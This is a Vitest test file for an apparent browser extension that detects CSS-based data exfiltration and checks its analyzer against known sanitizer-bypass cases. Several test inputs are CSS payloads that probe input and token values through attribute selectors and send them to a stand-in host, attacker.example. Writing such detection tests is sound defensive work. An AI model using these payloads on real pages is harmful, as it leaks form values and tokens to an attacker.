import { describe, expect, it } from "vitest";
import { readFileSync, readdirSync } from "node:fs";
import { join } from "node:path";
import { analyzeStylesheet } from "../../src/core/analyzer/analyzeStylesheet";
import { scanDocument } from "../../src/browser/scanner/scanDocument";
import { scanHtmlResourceAttributes } from "../../src/browser/scanner/htmlResourceScan";

const pageUrl = "https://app.example.test/";
function hasFinding(css: string): boolean { return analyzeStylesheet({ cssText: css, pageUrl, sourceKind: "style_element", sourceUrl: pageUrl }).findings.some((finding) => finding.severity !== "info"); }

describe("SPEC and CVE_SPEC acceptance criteria", () => {
  it("covers issue-derived analyzer criteria", () => {
    expect(hasFinding('[data-value="0"]{background:url(/ok.png)}')).toBe(false);
    expect(hasFinding('input[value^="b"]{background:url(https://example.test/;base64,pwned.png)}')).toBe(true);
    expect(hasFinding('input[value^="b"]{background:url(https://example.test/a.png#;base64,)}')).toBe(true);
    expect(hasFinding('.icon{background:url(data:image/png;base64,iVBORw0KGgo=)}')).toBe(false);
    expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--link)}')).toBe(true);
    expect(hasFinding(':root{--link:url(https://attacker.example/x)}input[value^="x"]{background:var(--missing,var(--link))}')).toBe(true);
    expect(hasFinding('@supports(display:grid){@media screen{input[value^="x"]{background:url(https://attacker.example/x)}}}')).toBe(true);
    expect(hasFinding('form:has(input[name="token"][value^="x"]){background:url(https://attacker.example/x)}')).toBe(true);
    expect(hasFinding('svg:has(input[name="token"]){fill:url(https://attacker.example/paint.svg#x)}')).toBe(true);
    expect(hasFinding('.message-content .overlay{position:fixed !important;inset:0}')).toBe(false);
  });

  it("does not treat same-origin decorative HTML/SVG resources as actionable leaks", () => {
    const documentRef = new DOMParser().parseFromString('<body background="/theme.png"><svg><filter><feImage href="/shadow.png"></feImage></filter><animate attributeName="fill" values="url(/icon.svg#paint)"></animate></svg></body>', "text/html");
    const summary = scanHtmlResourceAttributes({ documentRef, pageUrl, frameUrl: pageUrl });
    expect(summary.findings.filter((finding) => finding.severity !== "info")).toHaveLength(0);
  });

  it("reports cross-origin frames as partial coverage", () => {
    document.body.innerHTML = '<iframe src="https://third-party.example.test/mail"></iframe>';
    const summary = scanDocument(document);
    expect(summary.partialFrames).toBeGreaterThan(0);
    expect(summary.findings.some((finding) => finding.reasons.includes("frame.cross_origin.uninspectable"))).toBe(true);
  });

  it("reports external SVG image documents as optional partial coverage", () => {
    document.body.innerHTML = '<img src="https://cdn.example.test/logo.svg"><object data="/local.svg"></object>';
    const summary = scanDocument(document, {
      mode: "balanced",
      advancedModeEnabled: true,
      trustedOrigins: [],
      blockedOrigins: [],
      strictOrigins: [],
      allowlistedOrigins: [],
      blocklistedOrigins: [],
      perOriginModes: {},
      logRetentionDays: 14,
      compatibility: {
        neverFetchRemoteCssFromExtension: true,
        enableDnrMitigation: true,
        enableStrictThirdPartyBlocking: true,
        showPartialAnalysisFindings: true,
        enableFirefoxEnhancedMode: false,
        reportExternalSvgImageDocuments: true,
        enableSvgImageDnrPolicy: false
      }
    });
    expect(summary.findings.some((finding) => finding.reasons.includes("resource.svg_image_document.uninspectable"))).toBe(true);
    expect(summary.partialStylesheets).toBeGreaterThan(0);
  });

  it("has all CVE and parser-differential fixture names in tests/fixtures", () => {
    const attacks = new Set(readdirSync(join(join(process.cwd(), "tests", "fixtures", "attacks"))));
    for (const expected of [
      "cve-2024-29384-parser-bypass.css",
      "cve-2024-33436-css-vars-url.css",
      "cve-2024-33436-css-vars-fallback-chain.css",
      "cve-2024-33437-nested-style-rules.css",
      "css-comments-hidden-url.css",
      "css-escaped-function-url.css",
      "css-mixed-case-import.css",
      "namespace-sanitizer-bypass.css",
      "parser-differential-malformed-recovery.css",
      "rendered-email-style-exfil.html",
      "rendered-helpdesk-email-css.html",
      "wordpress-comment-nonce-exfil.html",
      "markdown-rendered-style-tag.html",
      "inline-style-sensitive-value-url.html",
      "inline-style-var-chain-url.html",
      "inline-style-image-set-url.html",
      "cve-2025-68460-roundcube-style-sanitizer.html",
      "cve-2026-26079-roundcube-comment-css-injection.html",
      "cve-2026-35540-roundcube-stylesheet-link-local-network.html",
      "cve-2026-25916-roundcube-svg-feimage.html",
      "cve-2026-35542-roundcube-body-background.html",
      "cve-2026-35543-roundcube-svg-animate-url.html",
      "cve-2026-35545-roundcube-svg-animate-fill-filter-stroke.html",
      "cve-2026-35544-roundcube-fixed-position-important.html",
      "cve-2026-40301-domsanitizer-svg-style-url.html",
      "cve-2026-40301-domsanitizer-svg-style-import.html",
      "cve-2026-31873-unhead-mixed-case-data-css-link.html",
      "cve-2026-28348-lxml-html-clean-escaped-import.css",
      "large-stylesheet-full-source-scan-import.css",
      "large-stylesheet-full-source-scan-value-probe.css",
      "large-stylesheet-full-source-scan-nested.css"
    ]) {
      expect(attacks.has(expected), expected).toBe(true);
      expect(attacks.has(`${expected}.expected.json`), `${expected}.expected.json`).toBe(true);
    }
  });

  it("does not contain the deprecated fixed marker or extension-context fetch code", () => {
    const srcRoot = join(process.cwd(), "src");
    const files: string[] = [];
    const walk = (dir: string) => { for (const item of readdirSync(dir, { withFileTypes: true })) { const path = join(dir, item.name); if (item.isDirectory()) walk(path); else if (/\.(ts|tsx|css|html)$/.test(path)) files.push(path); } };
    walk(srcRoot);
    const source = files.map((file) => readFileSync(file, "utf8")).join("\n");
    expect(source).not.toContain("__css_exfil_protection_filtered_styles");
    expect(source).not.toMatch(/fetch\s*\([^)]*\.css/);
  });
});
